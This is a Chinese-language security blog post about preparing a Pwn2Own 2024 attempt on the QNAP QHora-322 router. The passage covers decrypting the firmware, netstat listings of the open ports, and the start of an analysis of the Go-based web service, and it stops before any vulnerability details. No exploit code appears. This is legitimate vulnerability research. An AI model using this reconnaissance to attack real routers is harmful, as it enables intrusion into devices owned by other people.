<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Zhiyuan">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2024/11/11/pwn2own-2024-qhora-322/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwn2Own-2024-QHora-322">
<meta property="og:url" content="http://example.com/2024/11/11/Pwn2Own-2024-QHora-322/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/redefine-og.webp">
<meta property="article:published_time" content="2024-11-11T14:43:43.000Z">
<meta property="article:modified_time" content="2025-05-17T06:25:26.688Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="IoT">
<meta property="article:tag" content="Vulnerability">
<meta property="article:tag" content="Qnap">
<meta property="article:tag" content="Pwn2Own">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/log2.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/log2.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/log2.ico">
    <!--- Page Info-->
    
    <title>
        
            Pwn2Own-2024-QHora-322 | Zhi0Yuan Blog
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/drak.png"},"title":"兴趣是坚持和耐心的源泉","subtitle":{"text":["Zhi0Yuan","独立安全研究员","Never Fade Away"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Zhi0Yuan","instagram":null,"zhihu":null,"twitter":"https://x.com/Zeroved0x5A","email":"czhi540@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/log.jpg" class="w-full h-full rounded-sm">
                </a>
            
            <a class="logo-title" href="/">
                
                Zhi0Yuan Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Pwn2Own-2024-QHora-322</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/log.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">Zhiyuan</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-11 22:43:43</span>
        <span class="mobile">2024-11-11 22:43:43</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-05-17 14:25:26</span>
            <span class="mobile">2025-05-17 14:25:26</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/My-Vulnerability/">My Vulnerability</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/IoT/">IoT</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Vulnerability/">Vulnerability</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Qnap/">Qnap</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Pwn2Own/">Pwn2Own</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>又到了新的一年的Pwn2Own, 在去年我分析<code>TP-Link ER605</code>后写的文章无人问津, 今年的比赛列表我们失去了好伙伴TP-Link, 所以继续在初始列表中选择目标, 按照去年的经验我选择的第一个目标一般来说都没有什么产出,那就是<code>Synology RT6600ax</code>, 为什么我的第一个目标会是它呢, 我在分析这个设备的历史漏洞时发现去年的初始列表中也有它看来我们不是第一次相遇了.</p>
</blockquote>
<blockquote>
<p>所以回到正题今年我们的目标设备是Qnap的<code>QHora332</code>路由器, 由于这个设备的价格过于离谱我想, 我的经济实力不允许我购买设备回来测试, 即使是<code>301W</code>在鱼上都需要800, 更别说<code>332</code>了, 高达3000多! 去年我买回来的ER605只需要350, 这简直天差地别, 所以我们只能够去官网下载个固件来在本地, 使用qemu去运行一下了.</p>
</blockquote>
<blockquote>
<p>在下面提到了许多的服务我很多都没有发现漏洞, 但是还是要写出来第一是帮助我理一理思路, 第二也是帮助未来的师傅快速的了解这个设备, 如果对于这些都不感兴趣可以直接看漏洞分析, 我并没有去查看缓冲区溢出(因为我对于缓冲区溢出的exp开发并不熟练和没有实体设备), 如果去仔细去看一下缓冲区溢出应该还是会有漏洞的.</p>
</blockquote>
<h2 id="固件的提取"><a href="#固件的提取" class="headerlink" title="固件的提取"></a>固件的提取</h2><blockquote>
<p>在准备分析一个设备之前我一定会做的一件事就是祈祷厂商不要加密固件, 不出意外的是果然当我使用<code>unblob</code>准备提取固件并大展身手时候, 现实给了我当头一棒没有办法只能够在google和github上找一找前人的足迹, 幸运女神再一次眷顾了我看来对于我来说运气是必不可少的,在github上找到了一个关于qnap的NAS设备的固件解密, 兴许能够用在router设备上?</p>
</blockquote>
<blockquote>
<p>我在openwrt的论坛中找到了答案.</p>
</blockquote>
<p><a class="link"   target="_blank" rel="noopener" href="https://forum.openwrt.org/t/adding-openwrt-support-for-qnap-qhora-301w/96934/28?page=2" >参考<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://gist.github.com/ulidtko/966277a465f1856109b2d2674dcee741" >解压工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<blockquote>
<p>密钥是下载的固件的文件名的前九个字符串,解密命令如下</p>
</blockquote>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./qnap-qts-fw-cryptor.py d QHora-322 QHora-322_20240710-2.4.1.634.img QHora-322_20240710-2.4.1.634.img.tgz</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="设备攻击面梳理"><a href="#设备攻击面梳理" class="headerlink" title="设备攻击面梳理"></a>设备攻击面梳理</h2><h3 id="开放的端口"><a href="#开放的端口" class="headerlink" title="开放的端口"></a>开放的端口</h3><blockquote>
<p>在设备上运行了<code>netstat -lpntu</code>命令后,我们可以初步看到设备开放了那些端口, 一共在两个设备上运行了该命令来看一下开放了那些端口.</p>
</blockquote>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Device1</span></span><br><span class="line">/ <span class="comment"># netstat -lpntu</span></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      9895/cloudagent     </span><br><span class="line">tcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      3505/rapid          </span><br><span class="line">tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      8083/redis-server </span><br><span class="line">tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      7656/systemd-resolv </span><br><span class="line">tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      2388310/dnsmasq         </span><br><span class="line">tcp        0      0 60.0.60.1:53            0.0.0.0:*               LISTEN      2388310/dnsmasq     </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      7656/systemd-resolv </span><br><span class="line">tcp        0      0 127.0.0.1:58080         0.0.0.0:*               LISTEN      8540/webframework   </span><br><span class="line">tcp        0      0 127.0.0.1:3008          0.0.0.0:*               LISTEN      7932/light-indicato </span><br><span class="line">tcp6       0      0 :::5355                 :::*                    LISTEN      7656/systemd-resolv </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      8540/webframework   </span><br><span class="line">tcp6       0      0 :::443                  :::*                    LISTEN      8540/webframework   </span><br><span class="line">udp        0      0 xx.xx.xxx.xxx:7788       0.0.0.0:*                           3626/quwan_wmd              </span><br><span class="line">udp        0      0 0.0.0.0:8099            0.0.0.0:*                           626710/python       </span><br><span class="line">udp        0      0 127.0.1.1:53            0.0.0.0:*                           2388310/dnsmasq     </span><br><span class="line">udp        0      0 192.168.102.1:53        0.0.0.0:*                           2388310/dnsmasq     </span><br><span class="line">udp        0      0 30.0.30.1:53            0.0.0.0:*                           2388310/dnsmasq     </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           7656/systemd-resolv </span><br><span class="line">udp        0      0 0.0.0.0:67              0.0.0.0:*                           7372/dhcpd          </span><br><span class="line">udp        0      0 0.0.0.0:67              0.0.0.0:*                           7240/dhcpd          </span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           5097/dhclient                </span><br><span class="line">udp        0      0 0.0.0.0:123             0.0.0.0:*                           9869/ntpd                 </span><br><span class="line">udp        0      0 0.0.0.0:4500            0.0.0.0:*                           4847/charon         </span><br><span class="line">udp        0      0 0.0.0.0:500             0.0.0.0:*                           4847/charon                 </span><br><span class="line">udp        0      0 127.0.0.1:5140          0.0.0.0:*                           3505/rapid          </span><br><span class="line">udp        0      0 0.0.0.0:5355            0.0.0.0:*                           7656/systemd-resolv </span><br><span class="line">udp        0      0 0.0.0.0:40224           0.0.0.0:*                           7305/dhcpd          </span><br><span class="line">udp    33600      0 0.0.0.0:36151           0.0.0.0:*                           7264/dhcpd          </span><br><span class="line">udp        0      0 0.0.0.0:5555            0.0.0.0:*                           -                           </span><br><span class="line">udp6       0      0 :::8097                 :::*                                7492/bcclient                 </span><br><span class="line">udp6       0      0 :::123                  :::*                                9869/ntpd           </span><br><span class="line">udp6       0      0 :::55516                :::*                                7343/dhcpd          </span><br><span class="line">udp6       0      0 :::47347                :::*                                7296/dhcpd          </span><br><span class="line">udp6       0      0 :::51567                :::*                                7264/dhcpd          </span><br><span class="line">udp6       0      0 :::4500                 :::*                                4847/charon         </span><br><span class="line">udp6       0      0 :::500                  :::*                                4847/charon         </span><br><span class="line">udp6       0      0 :::45557                :::*                                7361/dhcpd          </span><br><span class="line">udp6       0      0 fe80::265e:beff:fe8:546 :::*                                5168/dhcpcd                 </span><br><span class="line">udp6       0      0 :::5355                 :::*                                7656/systemd-resolv </span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Device2</span></span><br><span class="line">/ <span class="comment"># netstat -lpntu</span></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      7013/dnsmasq        </span><br><span class="line">tcp        0      0 10.11.12.1:53           0.0.0.0:*               LISTEN      7013/dnsmasq        </span><br><span class="line">tcp        0      0 198.18.2.1:53           0.0.0.0:*               LISTEN      7013/dnsmasq        </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      5836/systemd-resolv </span><br><span class="line">tcp        0      0 127.0.0.1:58080         0.0.0.0:*               LISTEN      7581/webframework   </span><br><span class="line">tcp        0      0 127.0.0.1:3008          0.0.0.0:*               LISTEN      6052/light-indicato </span><br><span class="line">tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      7594/cloudagent     </span><br><span class="line">tcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      3564/rapid          </span><br><span class="line">tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      6186/redis-server 1 </span><br><span class="line">tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      5836/systemd-resolv </span><br><span class="line">tcp6       0      0 :::443                  :::*                    LISTEN      7581/webframework   </span><br><span class="line">tcp6       0      0 :::5355                 :::*                    LISTEN      5836/systemd-resolv </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      7581/webframework   </span><br><span class="line">udp        0      0 198.18.2.1:123          0.0.0.0:*                           3128001/ntpd               </span><br><span class="line">udp        0      0 0.0.0.0:4433            0.0.0.0:*                           6484/qthd   * qnap专用vpn协议,需要共享密钥.       </span><br><span class="line">udp        0      0 0.0.0.0:4500            0.0.0.0:*                           4866/charon *  成熟的第三方应用   </span><br><span class="line">udp        0      0 0.0.0.0:500             0.0.0.0:*                           4866/charon *  成熟的第三方应用   </span><br><span class="line">udp        0      0 0.0.0.0:39771           0.0.0.0:*                           5452/dhcpd         </span><br><span class="line">udp        0      0 127.0.0.1:5140          0.0.0.0:*                           3564/rapid          </span><br><span class="line">udp   213696      0 0.0.0.0:1234            0.0.0.0:*                           5430/dm_agent *   函数名称的synology_scan(群晖?)    </span><br><span class="line">udp        0      0 0.0.0.0:5353            0.0.0.0:*                           5430/dm_agent *   函数名称mdns_scan</span><br><span class="line">udp        0      0 0.0.0.0:5355            0.0.0.0:*                           5836/systemd-resolv </span><br><span class="line">udp        0      0 0.0.0.0:5555            0.0.0.0:*                           -              *     </span><br><span class="line">udp        0      0 x.xx.xx.xxx:7788        0.0.0.0:*                           3652/quwan_wmd   *   </span><br><span class="line">udp        0      0 10.11.12.1:9999         0.0.0.0:*                           5430/dm_agent       </span><br><span class="line">udp        0      0 0.0.0.0:1900            0.0.0.0:*                           5430/dm_agent   *  函数名称ssdp_scan </span><br><span class="line">udp        0      0 10.11.12.1:1900         0.0.0.0:*                           5430/dm_agent       </span><br><span class="line">udp        0      0 0.0.0.0:8097            0.0.0.0:*                           5430/dm_agent   *  函数名称qnap_scan</span><br><span class="line">udp        0      0 127.0.1.1:53            0.0.0.0:*                           7013/dnsmasq        </span><br><span class="line">udp        0      0 10.11.12.1:53           0.0.0.0:*                           7013/dnsmasq        </span><br><span class="line">udp        0      0 198.18.2.1:53           0.0.0.0:*                           7013/dnsmasq        </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           5836/systemd-resolv </span><br><span class="line">udp        0      0 255.255.255.255:67      0.0.0.0:*                           5430/dm_agent       </span><br><span class="line">udp        0      0 0.0.0.0:67              0.0.0.0:*                           5452/dhcpd          </span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           3127761/dhclient           </span><br><span class="line">udp6       0      0 ::1:123                 :::*                                3128001/ntpd        </span><br><span class="line">udp6       0      0 :::123                  :::*                                3128001/ntpd        </span><br><span class="line">udp6       0      0 :::4500                 :::*                                4866/charon   * 成熟的第三方应用</span><br><span class="line">udp6       0      0 :::500                  :::*                                4866/charon   * 成熟的第三方应用</span><br><span class="line">udp6       0      0 :::54041                :::*                                5452/dhcpd          </span><br><span class="line">udp6       0      0 :::5355                 :::*                                5836/systemd-resolv </span><br><span class="line">udp6       0      0 :::8097                 :::*                                5574/bcclient  * qnap官方的发现服务</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>两台设备上有很多相同的端口开放比如 4500,500,8097,7788,5555,5355,5140. 选择几个不常见的程序来分析一下吧.</p>
</blockquote>
<h3 id="web服务-webframework"><a href="#web服务-webframework" class="headerlink" title="web服务-webframework"></a>web服务-webframework</h3><blockquote>
<p>web服务使用golnag gin web框架编写,认证框架使用的是gin-jwt,打开的端口有80,443,58080, 程序名称为<code>webframework</code>,使用sqlite3作为数据库支持.</p>
</blockquote>
<blockquote>
<p>感兴趣可以看一下gin-web的<a class="link"   target="_blank" rel="noopener" href="https://gin-gonic.com/docs/quickstart/" >官方文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, 使用官方的示例来解释一下好有一个初步的了解.</p>
</blockquote>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/ping&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;pong&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run() <span class="comment">// listen and serve on 0.0.0.0:8080</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>GET请求<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/ping%E5%B0%86%E4%BC%9A%E8%BF%94%E5%9B%9E%7B%22message%22:%22pong%22%7D%E7%9A%84json%E6%95%B0%E6%8D%AE" >http://127.0.0.1/ping将会返回{&quot;message&quot;:&quot;pong&quot;}的json数据<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, 在后面Ghidra中的伪代码中会有不同但并不影响.</p>
</blockquote>
<blockquote>
<p>web程序毋庸置疑需要认证和鉴权在这个程序中使用的是gin-jwt(由于我们的漏洞并不涉及权限bypass, 感兴趣的小伙伴可以看一下这个项目)<a class="link"   target="_blank" rel="noopener" href="https://github.com/appleboy/gin-jwt" >https://github.com/appleboy/gin-jwt<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<blockquote>
<p>下面来看一下具体的代码吧, 使用Ghidra分析程序. 可以安装一个插件可以更好的分析<a class="link"   target="_blank" rel="noopener" href="https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension" >GolangAnalyzerExtension<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<blockquote>
<p>web服务的路由定义在两个函数中<code>miro-webserver/routes/qhora_301w.InitRouters</code>和<code>miro-webserver/routes/qhora_301w.InitInternalRouters</code>第一个是绑定在80和443而第二个绑定在内部58080端口而这个端口只能够通过127.0.0.1去访问所以,我们只能够来看<code>miro-webserver/routes/qhora_301w.InitRouters</code></p>
</blockquote>
